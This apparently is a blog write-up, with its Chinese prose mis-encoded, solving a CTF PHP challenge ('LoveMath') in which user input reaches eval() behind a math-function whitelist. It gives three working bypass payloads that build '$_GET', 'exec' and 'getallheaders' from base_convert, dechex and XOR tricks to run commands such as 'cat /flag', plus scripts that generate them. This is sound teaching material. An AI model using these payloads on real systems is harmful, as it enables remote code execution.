    <content type="html"><![CDATA[<p>  å…ˆçœ‹åˆ°é¢˜ç›®ç»™å‡ºçš„æºç ï¼š</p><span id="more"></span><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token comment">//ä¾‹å­ c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dechex'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ä»£ç å®¡è®¡é™åˆ¶æ¡ä»¶</p><ul><li>ä¼ å…¥çš„<code>c</code>çš„å­—ç¬¦ä¸²é•¿åº¦å¤§å°ä¸èƒ½å¤§äº80</li><li>ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸èƒ½åŒ…å«<code>&#39; &#39;</code>, <code>&#39;\t&#39;</code>, <code>&#39;\r&#39;</code>, <code>&#39;\n&#39;</code>,<code>&#39;\&#39;&#39;</code>, <code>&#39;&quot;&#39;</code>, <code>&#39;``&#39;</code>, <code>&#39;\[&#39;</code>, <code>&#39;\]&#39;</code></li><li><code>preg_match_all</code>å°†åŒ¹é…åˆ°çš„ç»“æœä¼ ç»™<code>$used_funcs</code>ï¼Œ<code>$used_funcs</code>åªèƒ½æ˜¯<code>$whitelist</code>ä¸­çš„å‡½æ•°ï¼Œæ„è¯†å°±æ˜¯ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­çš„è¯ç»„ä¹Ÿåªèƒ½æ˜¯<code>$whitelist</code>ä¸­çš„å•è¯</li></ul><p>ä»¥ä¸Šæ¡ä»¶æ»¡è¶³åå³å¯ä¼ å…¥<code>eval</code>ä¸­æ‰§è¡Œä»£ç </p><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre><p>åˆ†æï¼š</p><ul><li><code>base_convert</code>å‡½æ•°çš„åŠŸèƒ½æ˜¯åœ¨ä»»æ„è¿›åˆ¶çš„å­—ç¬¦ä¸²ä¹‹é—´è½¬æ¢æ•°å­—<code>base_convert(37907361743,10,36)  ==&gt;  hex2bin</code></li><li><code>dechex(1598506324)  ==&gt;  5f474554</code>ï¼Œ<code>hex2bin(&quot;5f474554&quot;)  ==&gt;  _GET</code></li><li>é€‰ç”¨<code>pi</code>çš„åŸå› æ˜¯å› ä¸ºé¢˜ç›®æœ‰é•¿åº¦é™åˆ¶ï¼Œç™½åå•ä¸­æœ€çŸ­çš„å°±æ˜¯è¿™ä¸¤ä¸ªå­—ç¬¦<code>pi</code>ï¼Œæ•…é€‰å®ƒ</li><li>å½“<code>$pi</code>=<code>_GET</code>ä¹‹åå†åœ¨å‰é¢åŠ ä¸€ä¸ª<code>$</code>å°±å½¢æˆäº†<code>$_GET</code></li><li><code>($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)</code>ç¿»è¯‘è¿‡æ¥å°±æ˜¯<code>($_GET)&#123;1&#125;(($_GET)&#123;2&#125;) === $_GET[1]($_GET[2])</code>ï¼Œä¼ å…¥<code>1=system</code>å³å¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</li></ul><p>ä¸¾ä¸€åä¸‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ”¹å¦‚ä½•æ„é€ å‡ºè¿™ç§æ–¹æ³•å‘¢ï¼Ÿ<code>base_convert</code>çš„è¿›åˆ¶è½¬æ¢ä¸çŸ¥é“çš„è¯åˆæ€ä¹ˆçŸ¥é“è¯¥ä¼ å…¥ä»€ä¹ˆæ•°å­—å’Œè¿›åˆ¶å‘¢ï¼Ÿäºæ˜¯å†™å‡ºæ„é€ è„šæœ¬ï¼š</p><p><code>base_convert</code>å‡½æ•°æ„é€ ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'hex2bin'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'len='</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token string single-quoted-string">'base_convertå‚æ•°->'</span><span class="token operator">.</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$j</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿™æ ·å³å¯å¾—åˆ°æ‰€æœ‰çš„è¿›åˆ¶è½¬æ¢ç»“æœï¼Œå½“ç„¶å¦‚æœé¢˜ç›®æ²¡æœ‰å¼•å·é™åˆ¶ï¼Œ<code>is_numeric</code>å‡½æ•°ä¹Ÿå¯ä»¥å»æ‰ï¼Œåœ¨é‡Œé¢é€‰å–æ‰€éœ€è¦çš„å³å¯</p><p>é‚£ä¹ˆ<code>dechex</code>å¦‚ä½•æ„é€ å‘¢ï¼Ÿè¿™ä¸ªå°±ç®€å•äº†ï¼Œä¸¤è¡Œä»£ç å°±å¯ä»¥æå®š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"_GET"</span><span class="token punctuation">;</span><span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$num</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>è¾“å‡ºçš„ç»“æœæ—¢æ˜¯å¯ä¼ å…¥çš„å€¼</p><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">,</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">47138</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p>åˆ†æï¼š</p><ul><li><code>base_convert(47138,20,36)  ==&gt;  exec</code>ï¼Œexecæ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åºï¼Œè¿”å›æœ€åä¸€è¡Œå†…å®¹</li><li><code>base_convert(8768397090111664438,10,30)  ==&gt;   getallheaders</code>ï¼Œè·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯</li><li>ä»¥ä¸Šè¯­å¥ç¿»è¯‘ä¸‹æ¥å°±æ˜¯<code>exec(getallheaders()&#123;1&#125;)</code>ï¼Œå¯ä»¥è·å–è¯·æ±‚å¤´ç¬¬ä¸€ä¸ªå­—æ®µçš„å€¼ï¼Œ<code>[]</code>è¢«wafå¯ä»¥ç”¨<code>&#123;&#125;</code>åŒ…å›Šæ•°å­—æ¥è§£å†³ä»£æ›¿ç»•è¿‡ä¸­æ‹¬å·å’Œå¼•å·</li></ul><p>å‘åŒ…å³å¯æ‹¿åˆ°flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CISCN-LoveMath-php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C/image-20200517213809635.png" alt loading="lazy"></p><p>å½“ç„¶è¿™é‡Œç›´æ¥<code>cat flag</code>ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">47138</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">109270211243818</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å‘½ä»¤æ‰§è¡Œå°±æ˜¯<code>exec(&quot;cat /*&quot;)</code>ï¼Œå¯ä»¥æ‰“å°å‡ºflag</p><h3 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a>æ–¹æ³•ä¸‰</h3><p>åˆ©ç”¨å¼‚æˆ–å°†å­—ç¬¦ä¸²è½¬åŒ–æˆæˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚æˆ‘ä»¬éœ€è¦<code>$_GET</code>ï¼Œé‚£ä¹ˆå°±è¦è·å¾—<code>_GET</code>ï¼ŒFUZZä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"^<span class="token interpolation"><span class="token variable">$i</span></span><span class="token interpolation"><span class="token variable">$j</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"==><span class="token interpolation"><span class="token variable">$exp</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>åœ¨æ‰“å°å‡ºçš„ç»“æœä¸­æœå¯»æƒ³è¦çš„å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°æœ€çŸ­çš„å†ç»„åˆ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token punctuation">(</span>is_nan<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span>tan<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token variable">$$pi</span><span class="token punctuation">;</span><span class="token variable">$pi</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><ul><li><code>is_nan^(6).(4)  ==&gt;  _G</code></li><li><code>tan^(1).(5)  ==&gt;  ET</code></li><li>ä»¥ä¸Šå°±å’Œç¬¬ä¸€ç§æ–¹æ³•ç±»ä¼¼ï¼Œç„¶ååœ¨ä¼ å‘½ä»¤æ‰§è¡Œçš„ä»£ç å°±å¯ä»¥äº†</li></ul><p>å‚è€ƒï¼š</p><ul><li><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a></li></ul><p>é¢˜ç›®è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œå¦‚æœå†å‘ç°æ–°æ–¹æ³•å†è¡¥ä¸Š</p>]]></content>
    
    <summary type="html">
    
